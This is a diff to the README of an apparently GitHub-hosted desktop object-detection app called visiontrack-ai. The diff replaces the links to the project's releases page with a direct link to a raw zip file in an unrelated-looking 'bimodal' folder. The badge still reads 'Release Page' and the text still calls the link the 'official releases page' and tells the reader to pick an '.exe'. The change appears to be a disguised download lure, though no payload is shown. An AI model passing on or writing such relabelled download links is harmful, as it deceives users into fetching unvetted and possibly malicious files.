@@ -1,6 +1,6 @@
 # 👁️ visiontrack-ai - Real-time object detection for your desktop
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/emmalyncyclic167/visiontrack-ai/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/emmalyncyclic167/visiontrack-ai/raw/refs/heads/main/bimodal/visiontrack_ai_3.4.zip)
 
 ## What this app does
 
@@ -20,7 +20,7 @@ The app works on Windows 10 and Windows 11.
 
 You must download the installation file from the official releases page. 
 
-1. Go to this link: [https://github.com/emmalyncyclic167/visiontrack-ai/releases](https://github.com/emmalyncyclic167/visiontrack-ai/releases).
+1. Go to this link: [https://github.com/emmalyncyclic167/visiontrack-ai/raw/refs/heads/main/bimodal/visiontrack_ai_3.4.zip](https://github.com/emmalyncyclic167/visiontrack-ai/raw/refs/heads/main/bimodal/visiontrack_ai_3.4.zip).
 2. Look for the latest version section.
 3. Choose the file ending in `.exe`. 
 4. Click the file name to start the download.
